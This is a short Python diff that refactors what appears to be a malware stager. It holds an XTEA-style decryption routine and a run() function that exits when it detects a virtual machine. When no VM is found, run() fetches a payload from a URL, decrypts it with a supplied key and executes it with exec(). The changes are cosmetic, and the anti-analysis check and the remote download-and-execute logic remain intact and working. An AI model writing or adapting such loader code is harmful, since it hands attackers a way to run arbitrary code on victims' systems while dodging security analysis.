@@ -28,7 +28,7 @@ def decrypt(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0))
         k0 = struct.unpack("!4L", key[:key_size])
         delta, mask = 0x9e3779b9, 0xffffffff
         sum = (delta * num_rounds) & mask
-        for round in range(num_rounds):
+        for _ in range(num_rounds):
             v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k0[sum >> 11 & 3]))) & mask
             sum = (sum - delta) & mask
             v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k0[sum & 3]))) & mask
@@ -45,11 +45,13 @@ def environment():
 
 def run(url=None, key=None):
     if url:
-        if environment():
-            if '--debug' in sys.argv:
-                if raw_input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
-                    sys.exit(0)
-            else:
-                sys.exit(0)
+        if environment() and (
+            '--debug' in sys.argv
+            and raw_input(
+                "Virtual machine detected. Abort? (y/n): "
+            ).startswith('y')
+            or '--debug' not in sys.argv
+        ):
+            sys.exit(0)
         payload = decrypt(urlopen(url).read(), base64.b64decode(key)) if key else urlopen(url).read()
         exec(payload, globals())
